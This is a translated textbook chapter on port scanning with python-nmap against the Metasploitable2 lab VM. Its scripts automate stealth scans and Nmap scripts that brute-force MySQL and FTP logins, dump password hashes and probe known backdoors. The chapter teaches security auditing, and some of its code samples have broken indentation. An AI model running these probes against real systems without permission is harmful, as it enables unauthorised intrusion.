+   [`pexpect.readthedocs.io/en/stable/api/pxssh.html`](http://pexpect.readthedocs.io/en/stable/api/pxssh.html)

+   [`pysnmp.sourceforge.net/quick-start.html`](http://pysnmp.sourceforge.net/quick-start.html)

对于对如何使用 Paramiko 创建到远程服务器的隧道感兴趣的读者，可以在 PyPI 存储库中检查**sshtunnel**模块：[ https://pypi.org/project/sshtunnel/](https://pypi.org/project/sshtunnel/)。

文档和示例可在 GitHub 存储库中找到：[`github.com/pahaz/sshtunnel.`](https://github.com/pahaz/sshtunnel)


# 第八章：使用 Nmap 扫描器

本章涵盖了如何使用 python-nmap 进行网络扫描，以收集有关网络、主机和主机上运行的服务的信息。一些允许端口扫描和自动检测服务和开放端口的工具，我们可以在 Python 中找到，其中我们可以突出显示 python-nmap。Nmap 是一个强大的端口扫描器，可以帮助您识别打开、关闭或过滤的端口。它还允许编程例程和脚本来查找给定主机可能存在的漏洞。

本章将涵盖以下主题：

+   学习和理解 Nmap 协议作为端口扫描器，以识别主机上运行的服务

+   学习和理解使用 Nmap 的`python-nmap`模块，这是一个非常有用的工具，可以优化与端口扫描相关的任务

+   学习和理解使用`python-nmap 模块`进行同步和异步扫描

+   学习和理解 Nmap 脚本，以便检测网络或特定主机中的漏洞

# 技术要求

本章的示例和源代码可在 GitHub 存储库的`chapter8`文件夹中找到：

[`github.com/PacktPublishing/Mastering-Python-for-Networking-and-Security`](https://github.com/PacktPublishing/Mastering-Python-for-Networking-and-Security)。

您需要在本地机器上安装一个至少有 4GB 内存的 Python 发行版。在本章中，我们将使用一个**虚拟机**，用于进行与端口分析和漏洞检测相关的一些测试。它可以从`sourceforge`页面下载：

[`sourceforge.net/projects/metasploitable/files/Metasploitable2`](https://sourceforge.net/projects/metasploitable/files/Metasploitable2)

要登录，您必须使用用户名`msfadmin`和密码`msfadmin`：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-py-net-sec/img/a762810d-c72e-4099-a79a-7b232836446a.png)

如果我们执行`ifconfig`命令，我们可以看到网络的配置和我们可以用来执行测试的 IP 地址。在这种情况下，我们本地网络的 IP 地址是**192.168.56.101**：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-py-net-sec/img/ae16ef46-b2ea-4c49-b9ef-88ce95a6e9cc.png)

如果我们使用`nmap`命令进行端口扫描，我们可以看到虚拟机中打开的端口：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-py-net-sec/img/c573f22c-7a09-47bf-b71f-5994d039b4db.png)

基本上，Metasploitable 虚拟机（vm）是 Ubuntu Linux 的一个易受攻击的版本，旨在测试安全工具并演示常见的漏洞。

您可以在以下指南中找到有关此虚拟机的更多信息：[`metasploit.help.rapid7.com/docs/metasploitable-2-exploitability-guide.`](https://metasploit.help.rapid7.com/docs/metasploitable-2-exploitability-guide)

# 介绍使用 Nmap 进行端口扫描

在这一部分，我们将回顾 Nmap 工具用于端口扫描以及它支持的主要扫描类型。我们将了解 Nmap 作为一个端口扫描器，它允许我们分析机器上运行的端口和服务。

# 介绍端口扫描

一旦我们在我们的网络中确定了端点，下一步就是进行端口扫描。支持通信协议的计算机利用端口来建立连接。为了支持与多个应用程序的不同对话，端口用于区分同一台机器或服务器中的各种通信。例如，Web 服务器可以使用**超文本传输协议**（**HTTP**）来提供对使用 TCP 端口号`80`的网页的访问。**简单邮件传输协议**或**SMTP**使用端口`25`来发送或传输邮件消息。对于每个唯一的 IP 地址，协议端口号由一个 16 位数字标识，通常称为端口号`0-65,535`。端口号和 IP 地址的组合提供了通信的完整地址。根据通信的方向，需要源地址和目标地址（IP 地址和端口组合）。

# 使用 Nmap 进行扫描的类型

网络映射器（Nmap）是用于网络发现和安全审计的免费开源工具。它可以在所有主要计算机操作系统上运行，并且针对 Linux、Windows 和 Mac OS X 提供官方二进制包。python-nmap 库有助于以编程方式操纵 Nmap 的扫描结果，以自动执行端口扫描任务。

Nmap 工具主要用于识别和扫描特定网络段中的端口。从网站[`nmap.org`](https://nmap.org)，我们可以根据要安装的操作系统下载最新版本。

如果我们从控制台运行 Nmap 工具，我们会得到这个：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-py-net-sec/img/c3307890-497e-4407-b904-5f7d0890ea6b.png)

我们可以看到我们有以下**扫描类型**：

sT（TCP Connect 扫描）：这通常用于检测端口是否打开或关闭的选项，但通常是最受审计和最受入侵检测系统监视的机制。使用此选项，如果服务器在发送具有 SYN 标志的数据包时响应一个包含 ACK 标志的数据包，则端口是打开的。

sS（TCP Stealth 扫描）：这是一种基于 TCP Connect 扫描的扫描类型，其不同之处在于不完全进行指定端口的连接。它包括在检查发送具有 SYN 标志的数据包之前检查目标的响应数据包。如果目标以激活了 RST 标志的数据包响应，则可以检查端口是打开还是关闭。

u（UDP 扫描）：这是一种基于 UDP 协议的扫描类型，其中不进行连接过程，而只是发送一个 UDP 数据包来确定端口是否打开。如果答案是另一个 UDP 数据包，则意味着该端口是打开的。如果答案返回，端口是关闭的，并且将收到 ICMP 类型 3（目的地不可达）的数据包。

sA（TCP ACK 扫描）：这种扫描类型让我们知道我们的目标机器是否运行任何类型的防火墙。这种扫描发送一个激活了 ACK 标志的数据包到目标机器。如果远程机器以激活了 RST 标志的数据包响应，可以确定该端口没有被任何防火墙过滤。如果远程不响应，或者以 ICMP 类型的数据包响应，可以确定有防火墙过滤发送到指定端口的数据包。

sN（TCP 空扫描）：这是一种扫描类型，它向目标机器发送一个没有任何标志的 TCP 数据包。如果远程机器没有发出响应，可以确定该端口是打开的。否则，如果远程机器返回一个 RST 标志，我们可以说该端口是关闭的。

sF（TCP FIN 扫描）：这是一种向目标机器发送带有 FIN 标志的 TCP 数据包的扫描类型。如果远程机器没有发出响应，可以确定该端口是打开的。如果远程机器返回一个 RST 标志，我们可以说该端口是关闭的。

sX（TCP XMAS 扫描）：这是一种向目标机器发送带有 PSH、FIN 或 URG 标志的 TCP 数据包的扫描类型。如果远程机器没有发出响应，可以确定该端口是打开的。如果远程机器返回一个 RST 标志，我们可以说该端口是关闭的。如果在响应数据包中获得 ICMP 类型 3 的响应，则端口被过滤。

默认扫描类型可能会因运行它的用户而异，因为在扫描期间允许发送数据包的权限不同。扫描类型之间的区别在于每种类型生成的“噪音”，以及它们避免被安全系统（如防火墙或入侵检测系统）检测到的能力。

如果我们想创建一个端口扫描程序，我们将不得不为每个打开端口的套接字创建一个线程，并通过交通灯管理屏幕的共享使用。通过这种方法，我们将有一个很长的代码，而且我们只会执行一个简单的 TCP 扫描，而不是 Nmap 工具包提供的 ACK、SYN-ACK、RST 或 FIN。

由于 Nmap 响应格式是 XML，因此很容易编写一个 Python 模块，允许解析此响应格式，提供与 Nmap 的完全集成，并能够运行更多类型的扫描。因此，`python-nmap`模块成为执行这些类型任务的主要模块。

# 使用 python-nmap 进行端口扫描

在本节中，我们将回顾 Python 中用于端口扫描的`python-nmap`模块。我们将学习`python-nmap`模块如何使用 Nmap，以及它如何是一个非常有用的工具，用于优化有关在特定目标（域、网络或 IP 地址）上发现服务的任务。

# 介绍 python-nmap

在 Python 中，我们可以通过 python-nmap 库使用 Nmap，这使我们可以轻松地操作扫描结果。此外，对于系统管理员或计算机安全顾问来说，它可以是自动化渗透测试过程的完美工具。

python-nmap 是在安全审计或入侵测试范围内使用的工具，其主要功能是发现特定主机开放的端口或服务。此外，它的优势在于与 2.x 和 3.x 版本兼容。

您可以从 Bitbucket 存储库获取 python-nmap 的源代码：

[`bitbucket.org/xael/python-nmap`](https://bitbucket.org/xael/python-nmap)

最新版本的 python-nmap 可以从以下网站下载：

[`xael.org/pages/python-nmap-en.html`](http://xael.org/pages/python-nmap-en.html)

[`xael.org/norman/python/python-nmap`](https://xael.org/norman/python/python-nmap/)

# 安装 python-nmap

要进行安装，请解压下载的软件包，跳转到新目录，并执行安装命令。

在此示例中，我们正在安装源包的版本 0.5：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-py-net-sec/img/9bd17528-a2bf-482d-99f8-022e05defafe.png)

还可以使用`pip install`工具安装模块，因为它在官方存储库中。要安装模块，需要以管理员权限执行命令或使用系统超级用户（`sudo`）：

```py
sudo apt-get install python-pip nmap
sudo pip install python-nmap
```

# 使用 python-nmap

现在，您可以导入 python-nmap 模块，我们可以从脚本或交互式终端中调用它，例如：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-py-net-sec/img/a1a8c4c9-d51c-404b-9639-4d9f6096f9b0.png)

一旦我们验证了模块的安装，我们就可以开始对特定主机执行扫描。为此，我们必须对`PortScanner()`类进行实例化，以便访问最重要的方法：`scan()`。了解函数、方法或对象的工作原理的一个好方法是使用`**help()**`或`dir()`函数来查找模块中可用的方法：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-py-net-sec/img/cf3f783d-4fc0-46e8-9f07-7d2461a46018.png)

如果我们执行`help (port_scan.scan)`命令，我们会看到`PortScanner`类的`scan`方法接收三个参数，主机、端口和参数，最后添加参数（所有参数都必须是字符串）。

使用`help`命令，我们可以看到信息：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-py-net-sec/img/4862ae4b-1d55-43a2-bfd5-8221da7839e6.png)

我们首先要做的是导入 Nmap 库并创建我们的对象，以开始与`PortScanner()`进行交互。

我们使用`scan ('ip', 'ports')`方法启动我们的第一次扫描，其中第一个参数是 IP 地址，第二个是端口列表，第三个参数是可选的。如果我们不定义它，将执行标准的 Nmap 扫描：

```py
import nmap
nm = nmap.PortScanner()
results = nm.scan('192.168.56.101', '1-80','-sV')
```

在这个例子中，对具有 IP 地址`192.168.56.101`的虚拟机在`1-80`范围内的端口进行扫描。使用`**参数-sV**`，我们告诉你在调用扫描时检测版本。

扫描结果是一个包含与直接使用 Nmap 进行扫描返回的相同信息的字典。我们还可以返回到我们用`PortScanner()`类实例化的对象并测试其方法。我们可以在下一个截图中看到已执行的`nmap`命令，使用`command_line()`方法。

要获取运行在特定端口上的服务器的更多信息，我们可以使用`tcp()`方法来实现。

在这个例子中，我们可以看到如何使用`tcp`方法获取有关特定端口的信息：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-py-net-sec/img/209c0f9e-bbaa-4c09-b95f-8dbe80527859.png)

我们还可以使用`state()`函数来查看主机是否处于启动状态，该函数返回我们在上一个截图中看到的状态属性：

```py
nmap['192.168.56.101'].state()
```

我们还有`all_hosts()`方法来扫描所有主机，通过它我们可以看到哪些主机是启动的，哪些是关闭的：

```py
for host in nmap.all_hosts():
    print('Host : %s (%s)' % (host, nmap[host].hostname()))
    print('State : %s' % nmap[host].state())
```

我们还可以看到在扫描过程中哪些服务给出了某种响应，以及使用的`scanning`方法：

```py
nm.scaninfo()
```

我们还扫描所有协议：

```py
for proto in nmap[host].all_protocols():
    print('Protocol : %s' % proto)
listport = nmap[host]['tcp'].keys()
listport.sort()
for port in listport:
    print('port : %s\tstate : %s' % (port,nmap[host][proto][port]['state']))
```

以下脚本尝试使用 python-nmap 在以下条件下进行扫描。

+   要扫描的端口：`21,22,23,80,8080`。

+   -n 选项不执行 DNS 解析。

+   一旦获取了扫描数据，将其保存在`scan.txt`文件中。

您可以在文件名`Nmap_port_scanner.py`中找到以下代码：

```py
#!/usr/bin/python

#import nmap module
import nmap

#initialize portScanner                       
nm = nmap.PortScanner()

# we ask the user for the host that we are going to scan
host_scan = raw_input('Host scan: ')
while host_scan == "":
    host_scan = raw_input('Host scan: ')

#execute scan in portlist
portlist="21,22,23,25,80,8080"
nm.scan(hosts=host_scan, arguments='-n -p'+portlist)

#show nmap command
print nm.command_line()

hosts_list = [(x, nm[x]['status']['state']) for x in nm.all_hosts()]
#write in scan.txt file
file = open('scan.txt', 'w')
for host, status in hosts_list:
    print host, status
    file.write(host+'\n')

#show state for each port
array_portlist=portlist.split(',')
for port in array_portlist:
state= nm[host_scan]['tcp'][int(port)]['state']
    print "Port:"+str(port)+" "+"State:"+state
    file.write("Port:"+str(port)+" "+"State:"+state+'\n')

#close file
file.close()
```

`Nmap_port_scanner.py`执行：

在这个截图中，我们可以看到以指定 IP 地址的 Metasploitable 虚拟机作为参数传递的端口的状态：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-py-net-sec/img/76bd821e-7d69-4d1c-a42b-7b16caa161b4.png)

# 使用 python-nmap 进行扫描模式

在这一部分中，我们回顾了`python-nmap`模块支持的扫描模式。`python-nmap`允许在两种模式下自动执行端口扫描任务和报告：同步和异步。使用异步模式，我们可以定义一个`callback`函数，当特定端口的扫描完成时将执行该函数，并且在此函数中，如果端口已打开，我们可以进行额外的处理，例如为特定服务（HTTP、FTP、MySQL）启动 Nmap 脚本。

# 同步扫描

在这个例子中，我们实现了一个允许我们扫描 IP 地址和作为参数传递给脚本的端口列表的类。

在主程序中，我们添加了处理输入参数所需的配置。我们执行一个循环，处理每个通过参数发送的端口，并调用`NmapScanner`类的`nmapScan(ip, port)`方法。

您可以在文件名`NmapScanner.py`中找到以下代码：

```py
import optparse, nmap

class NmapScanner:

    def __init__(self):
        self.nmsc = nmap.PortScanner()

    def nmapScan(self, host, port):
        self.nmsc.scan(host, port)
        self.state = self.nmsc[host]['tcp'][int(port)]['state']
        print " [+] "+ host + " tcp/" + port + " " + self.state

def main():
    parser = optparse.OptionParser("usage%prog " + "-H <target host> -p <target port>")
    parser.add_option('-H', dest = 'host', type = 'string', help = 'Please, specify the target host.')
    parser.add_option('-p', dest = 'ports', type = 'string', help = 'Please, specify the target port(s) separated by comma.')
    (options, args) = parser.parse_args()

    if (options.host == None) | (options.ports == None):
        print '[-] You must specify a target host and a target port(s).'
        exit(0)
    host = options.host
    ports = options.ports.split(',')

    for port in ports:
        NmapScanner().nmapScan(host, port)

if __name__ == "__main__":
    main()
```

我们可以在命令行中执行前面的脚本以显示选项：

```py
python NmapScanner.py -h
```

使用`-h`参数，我们可以查看脚本选项：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-py-net-sec/img/3a18d316-58bb-4571-87f6-1c07f4a8e128.png)

这是在使用前面的参数执行脚本时的输出：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-py-net-sec/img/1e37e36d-73fd-4d0d-9f45-1e948e29b36e.png)

除了执行端口扫描并通过控制台返回结果外，我们还可以生成一个 JSON 文档来存储给定主机的开放端口的结果。在这种情况下，我们使用`csv()`函数以便以易于收集所需信息的格式返回扫描结果。在脚本的末尾，我们看到如何调用定义的方法，通过参数传递 IP 和端口列表。

您可以在文件名`NmapScannerJSONGenerate.py`中找到以下代码：

```py
def nmapScanJSONGenerate(self, host, ports):
    try:
        print "Checking ports "+ str(ports) +" .........."
        self.nmsc.scan(host, ports)

        # Command info
        print "[*] Execuing command: %s" % self.nmsc.command_line()

        print self.nmsc.csv()
        results = {} 

        for x in self.nmsc.csv().split("\n")[1:-1]:
            splited_line = x.split(";")
            host = splited_line[0]
            proto = splited_line[1]
            port = splited_line[2]
            state = splited_line[4]

            try:
                if state == "open":
                    results[host].append({proto: port})
            except KeyError:
                results[host] = []
                results[host].append({proto: port})

        # Store info
        file_info = "scan_%s.json" % host
        with open(file_info, "w") as file_json:
            json.dump(results, file_json)

         print "[*] File '%s' was generated with scan results" % file_info 

 except Exception,e:
     print e
 print "Error to connect with " + host + " for port scanning" 
     pass
```

在这个截图中，我们可以看到`NmapScannerJSONGenerate`脚本的执行输出：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-py-net-sec/img/151f4d1e-e673-4c60-a8c9-6a21495607f6.png)

# 异步扫描

我们可以使用`PortScannerAsync()`类执行异步扫描。在这种情况下，当执行扫描时，我们可以指定一个额外的回调参数，其中我们定义`return`函数，该函数将在扫描结束时执行：

```py
import nmap

nmasync = nmap.PortScannerAsync()

def callback_result(host, scan_result):
    print host, scan_result

nmasync.scan(hosts='127.0.0.1', arguments='-sP', callback=callback_result)
while nmasync.still_scanning():
    print("Waiting >>>")
    nmasync.wait(2)
```

通过这种方式，我们可以定义一个`回调`函数，每当 Nmap 对我们正在分析的机器有结果时就会执行。

以下脚本允许我们使用 Nmap 异步执行扫描，以便通过输入参数请求目标和端口。脚本需要做的是在`MySQL 端口（3306）`上异步执行扫描，并执行 MySQL 服务可用的 Nmap 脚本。

为了测试它，我们可以在虚拟机**Metasploitable2**上运行它，该虚拟机的`3306`端口是开放的，除了能够执行 Nmap 脚本并获取有关正在运行的 MySQL 服务的附加信息。

你可以在文件名`NmapScannerAsync.py`中找到以下代码：

```py
import optparse, nmap
import json
import argparse

def callbackMySql(host, result):
    try:
        script = result['scan'][host]['tcp'][3306]['script']
        print "Command line"+ result['nmap']['command_line']
        for key, value in script.items():
            print 'Script {0} --> {1}'.format(key, value)
    except KeyError:
        # Key is not present
        pass

class NmapScannerAsync:

 def __init__(self):
        self.nmsync = nmap.PortScanner()
        self.nmasync = nmap.PortScannerAsync()

    def scanning(self):
        while self.nmasync.still_scanning():
            self.nmasync.wait(5)
```

这是检查作为参数传递的端口并以异步方式启动与 MySQL 相关的 Nmap 脚本的方法：

```py
def nmapScan(self, hostname, port):
        try:
            print "Checking port "+ port +" .........."
            self.nmsync.scan(hostname, port)
            self.state = self.nmsync[hostname]['tcp'][int(port)]['state']
            print " [+] "+ hostname + " tcp/" + port + " " + self.state 
            #mysql
            if (port=='3306') and self.nmsync[hostname]['tcp'][int(port)]['state']=='open':
                print 'Checking MYSQL port with nmap scripts......'
                #scripts for mysql:3306 open
                print 'Checking mysql-audit.nse.....'
                self.nmasync.scan(hostname,arguments="-A -sV -p3306 --script mysql-audit.nse",callback=callbackMySql)
                self.scanning()

                print 'Checking mysql-brute.nse.....'
                self.nmasync.scan(hostname,arguments="-A -sV -p3306 --script mysql-brute.nse",callback=callbackMySql)
                self.scanning()

                print 'Checking mysql-databases.nse.....'
                self.nmasync.scan(hostname,arguments="-A -sV -p3306 --script mysql-databases.nse",callback=callbackMySql)
                self.scanning()

                print 'Checking mysql-databases.nse.....'
                self.nmasync.scan(hostname,arguments="-A -sV -p3306 --script mysql-dump-hashes.nse",callback=callbackMySql)
                self.scanning()

                print 'Checking mysql-dump-hashes.nse.....'                                           self.nmasync.scan(hostname,arguments="-A -sV -p3306 --script mysql-empty-password.nse",callback=callbackMySql)
                self.scanning()

                print 'Checking mysql-enum.nse.....'
                self.nmasync.scan(hostname,arguments="-A -sV -p3306 --script mysql-enum.nse",callback=callbackMySql)
                self.scanning()

                print 'Checking mysql-info.nse".....'
                self.nmasync.scan(hostname,arguments="-A -sV -p3306 --script mysql-info.nse",callback=callbackMySql)
                self.scanning()

                print 'Checking mysql-query.nse.....'
                self.nmasync.scan(hostname,arguments="-A -sV -p3306 --script mysql-query.nse",callback=callbackMySql)
                self.scanning()

                print 'Checking mysql-users.nse.....'
                self.nmasync.scan(hostname,arguments="-A -sV -p3306 --script mysql-users.nse",callback=callbackMySql)
                self.scanning()

                print 'Checking mysql-variables.nse.....'
                self.nmasync.scan(hostname,arguments="-A -sV -p3306 --script mysql-variables.nse",callback=callbackMySql)
                self.scanning()

                print 'Checking mysql-vuln-cve2012-2122.nse.....'
                self.nmasync.scan(hostname,arguments="-A -sV -p3306 --script mysql-vuln-cve2012-2122.nse",callback=callbackMySql)
                self.scanning()

    except Exception,e:
        print str(e)
        print "Error to connect with " + hostname + " for port scanning"
        pass

```

这是我们的主程序，用于请求目标和端口作为参数，并为每个端口调用`nmapScan(ip,port)`函数：

```py
if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Nmap scanner async')
    # Main arguments
    parser.add_argument("-target", dest="target", help="target IP / domain", required=True)
    parser.add_argument("-ports", dest="ports", help="Please, specify the target port(s) separated by comma[80,8080 by default]", default="80,8080")
    parsed_args = parser.parse_args()   
    port_list = parsed_args.ports.split(',')
    ip = parsed_args.target
    for port in port_list:
        NmapScannerAsync().nmapScan(ip, port)
```

现在我们将使用目标和端口参数执行**NmapScannerAsync**：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-py-net-sec/img/51b57cc9-9cee-40c0-be75-1d1b5ac14250.png)

# Nmap 脚本中的漏洞

在本节中，我们将回顾`python-nmap`模块支持的扫描模式。我们将学习如何检测系统或网络段的开放端口，以及执行高级操作以收集有关其目标的信息，并检测 FTP 服务中的漏洞。

# 执行 Nmap 脚本以检测漏洞

Nmap 最有趣的功能之一是执行符合**Nmap 脚本引擎（NSE）**规范的脚本的能力。Nmap 使您能够进行漏洞评估和利用，这要归功于其强大的 Lua 脚本引擎。通过这种方式，我们还可以执行更复杂的例程，允许我们过滤有关特定目标的信息。

目前，它包括使用脚本来检查一些最知名的漏洞：

+   **Auth：**执行所有可用的认证脚本

+   **默认：**默认情况下执行工具的基本脚本

+   **发现：**从目标或受害者中检索信息

+   **外部：**使用外部资源的脚本

+   **侵入式：**使用被认为对受害者或目标具有侵入性的脚本

+   **恶意软件：**检查是否有恶意代码或后门打开的连接

+   **安全：**执行不具侵入性的脚本

+   **Vuln：**发现最知名的漏洞

+   **全部：**执行所有可用的 NSE 扩展脚本

为了检测开放的端口服务可能存在的漏洞，我们可以利用模块安装时可用的 Nmap 脚本。在**UNIX**机器上，脚本位于路径：`/usr/share/nmap/scripts.`

在**Windows**机器上，脚本位于路径：**C:\Program Files (x86)\Nmap\scripts**.

脚本允许编程例程以查找给定主机可能存在的漏洞。脚本可以在以下 URL 中找到：

[`nmap.org/nsedoc/scripts`](https://nmap.org/nsedoc/scripts)

对于我们想要了解更多的每种类型的服务，都有很多脚本。甚至有一些允许使用字典或暴力攻击，并利用机器暴露的一些服务和端口中的某些漏洞。

要执行这些脚本，需要在`nmap`命令中传递**--script 选项**。

在这个例子中，我们使用认证脚本（`auth`）执行 Nmap，它将检查是否有空密码的用户或默认存在的用户和密码。

使用这个命令，它可以在 MySQL 和 web 服务器（tomcat）的服务中找到用户和密码：

```py
nmap -f -sS -sV --script auth 192.168.56.101
```

在这个例子中，显示了**mysql 端口 3306**允许使用空密码连接到 root 帐户。它还显示了从端口`80`收集的信息，例如计算机名称和操作系统版本（Metasploitable2 - Linux）：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-py-net-sec/img/90b57a41-d3b0-4a84-8c3e-267f25a4e12d.png)

Nmap 还包含的另一个有趣的脚本是**discovery**，它允许我们了解有关我们正在分析的虚拟机上运行的服务的更多信息。

通过`discovery`选项，我们可以获取有关在虚拟机上运行的应用程序相关的服务和路由的信息：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-py-net-sec/img/d9b6cec9-5f46-46d0-8c3d-3efff85a14f7.png)

# 检测 FTP 服务中的漏洞

如果我们在端口`21`上在目标机器上运行**ftp-anon 脚本**，我们可以知道 FTP 服务是否允许匿名身份验证而无需输入用户名和密码。在这种情况下，我们看到 FTP 服务器上确实存在这样的身份验证：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-py-net-sec/img/38c765d5-5135-4478-b027-4ff95611be2d.png)

在下面的脚本中，我们以异步方式执行扫描，以便我们可以在特定端口上执行扫描并启动并行脚本，因此当一个脚本完成时，将执行`defined`函数。在这种情况下，我们执行为 FTP 服务定义的脚本，每次从脚本获得响应时，都会执行**`callbackFTP`**函数，这将为我们提供有关该服务的更多信息。

您可以在文件名`NmapScannerAsync_FTP.py`中找到以下代码：

```py
#!/usr/bin/env python
# -*- encoding: utf-8 -*-

import optparse, nmap
import json
import argparse

def callbackFTP(host, result):
    try:
        script = result['scan'][host]['tcp'][21]['script']
        print "Command line"+ result['nmap']['command_line']
        for key, value in script.items():
            print 'Script {0} --> {1}'.format(key, value)
    except KeyError:
        # Key is not present
        pass

class NmapScannerAsyncFTP:

    def __init__(self):
        self.nmsync = nmap.PortScanner()
        self.nmasync = nmap.PortScannerAsync()

    def scanning(self):
        while self.nmasync.still_scanning():
            self.nmasync.wait(5)
```

这是检查传递的端口并以异步方式启动与 FTP 相关的 Nmap 脚本的方法：

```py

    def nmapScanAsync(self, hostname, port):
        try:
            print "Checking port "+ port +" .........."
            self.nmsync.scan(hostname, port)
            self.state = self.nmsync[hostname]['tcp'][int(port)]['state']
            print " [+] "+ hostname + " tcp/" + port + " " + self.state 

             #FTP
             if (port=='21') and self.nmsync[hostname]['tcp'][int(port)]['state']=='open':
                print 'Checking ftp port with nmap scripts......'
                #scripts for ftp:21 open
                print 'Checking ftp-anon.nse .....'
                self.nmasync.scan(hostname,arguments="-A -sV -p21 --script ftp-anon.nse",callback=callbackFTP)
                self.scanning()
                print 'Checking ftp-bounce.nse .....'
                self.nmasync.scan(hostname,arguments="-A -sV -p21 --script ftp-bounce.nse",callback=callbackFTP)
                self.scanning()
                print 'Checking ftp-brute.nse .....'
                self.nmasync.scan(hostname,arguments="-A -sV -p21 --script ftp-brute.nse",callback=callbackFTP)
                self.scanning()
                print 'Checking ftp-libopie.nse .....'
                self.nmasync.scan(hostname,arguments="-A -sV -p21 --script ftp-libopie.nse",callback=callbackFTP)
                self.scanning()
                print 'Checking ftp-proftpd-backdoor.nse .....'
                self.nmasync.scan(hostname,arguments="-A -sV -p21 --script ftp-proftpd-backdoor.nse",callback=callbackFTP)
                self.scanning()
                print 'Checking ftp-vsftpd-backdoor.nse .....'
                self.nmasync.scan(hostname,arguments="-A -sV -p21 --script ftp-vsftpd-backdoor.nse",callback=callbackFTP)
                self.scanning()

    except Exception,e:
        print str(e)
        print "Error to connect with " + hostname + " for port scanning" 
        pass

```

这是我们的主程序，用于请求目标和端口作为参数，并调用`nmapScanAsync(ip,port)`函数来处理每个端口：

```py
if __name__ == "__main__":

    parser = argparse.ArgumentParser(description='Nmap scanner async')
    # Main arguments
    parser.add_argument("-target", dest="target", help="target IP / domain", required=True)
    parser.add_argument("-ports", dest="ports", help="Please, specify the target port(s) separated by comma[80,8080 by default]", default="80,8080")

    parsed_args = parser.parse_args()

    port_list = parsed_args.ports.split(',')

    ip = parsed_args.target

    for port in port_list:
        NmapScannerAsyncFTP().nmapScanAsync(ip, port)
```

现在，我们将使用目标和端口参数执行**NmapScannerAsync_fFTP**。

在这种情况下，我们对 FTP 端口（`21`）进行扫描，我们可以看到它执行了为该端口定义的每个脚本，并返回了更多信息，我们可以在以后的攻击或利用过程中使用。

我们可以通过执行上一个脚本来获取有关 FTP 易受攻击服务的信息：

```py
python NmapScannerAsync.py -target 192.168.56.101 -ports 21
```

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-py-net-sec/img/134612ea-bb70-4217-a4ef-9127fddd1f81.png)

# 总结

这个主题的一个目标是了解允许在特定域或服务器上执行端口扫描的模块。在 Python 中执行端口扫描的最佳工具之一是 python-nmap，它是`nmap`命令的包装器模块。还有其他选择，比如 Scrapy，也可以很好地完成这些任务，并且还允许我们更深入地了解这些工具的工作原理。

在下一章中，我们将更多地探讨与 Metasploit 框架交互的编程包和 Python 模块，以利用漏洞。

# 问题

1.  哪种方法允许我们查看已被扫描的机器？

1.  如果我们想要执行异步扫描并在扫描结束时执行脚本，调用`scan`函数的方法是什么？

1.  我们可以使用哪种方法以字典格式获取扫描结果？

1.  用于执行异步扫描的`Nmap`模块是什么类型？

1.  用于执行同步扫描的`Nmap`模块是什么类型？

1.  如果我们使用指令`self.nmsync = nmap.PortScanner()`初始化对象，我们如何在给定主机和给定端口上启动同步扫描？

1.  我们可以使用哪种方法来检查特定网络中的主机是否启动？

1.  使用`PortScannerAsync()`类进行异步扫描时，需要定义哪个函数？

1.  如果我们需要知道 FTP 服务是否允许匿名身份验证而无需输入用户名和密码，我们需要在端口`21`上运行哪个脚本？

1.  如果我们需要知道 MySQL 服务是否允许匿名身份验证而无需输入用户名和密码，我们需要在端口`3306`上运行哪个脚本？

# 进一步阅读

在这些链接中，您将找到有关先前提到的工具的更多信息，以及我们用于脚本执行的 Metasploitable 虚拟机的官方文档。

+   [`xael.org/pages/python-nmap-en.html`](http://xael.org/pages/python-nmap-en.html)

+   [`nmap.org/nsedoc/scripts`](https://nmap.org/nsedoc/scripts)

+   [`metasploit.help.rapid7.com/docs/metasploitable-2-exploitability-guide`](https://metasploit.help.rapid7.com/docs/metasploitable-2-exploitability-guide)

+   [`information.rapid7.com/download-metasploitable-2017.html`](https://information.rapid7.com/download-metasploitable-2017.html)

+   [`media.blackhat.com/bh-us-10/whitepapers/Vaskovitch/BlackHat-USA-2010-Fyodor-Fifield-NMAP-Scripting-Engine-wp.pdf`](https://media.blackhat.com/bh-us-10/whitepapers/Vaskovitch/BlackHat-USA-2010-Fyodor-Fifield-NMAP-Scripting-Engine-wp.pdf)

+   SPARTA 端口扫描：[`sparta.secforce.com`](https://sparta.secforce.com)

SPARTA 是一个用 Python 开发的工具，允许进行端口扫描、渗透测试和安全检测，用于检测已打开的服务，并与 Nmap 工具集成进行端口扫描。SPARTA 将要求您指定要扫描的 IP 地址范围。扫描完成后，SPARTA 将识别任何机器，以及任何打开的端口或正在运行的服务。


# 第九章：与 Metasploit 框架连接

本章涵盖了 Metasploit 框架作为利用漏洞的工具，以及如何使用 Python 中的`Python-msfprc`和`pyMetasploit`模块进行编程。这些模块帮助我们在 Python 和 Metasploit 的 msgrpc 之间进行交互，以自动执行 Metasploit 框架中的模块和利用。

本章将涵盖以下主题：

+   Metasploit 框架作为利用漏洞的工具

+   `msfconsole`作为与 Metasploit Framework 交互的命令控制台界面

+   将 Metasploit 连接到`python-msfrpc`模块

+   将 Metasploit 连接到`pyMetasploit`模块

# 技术要求

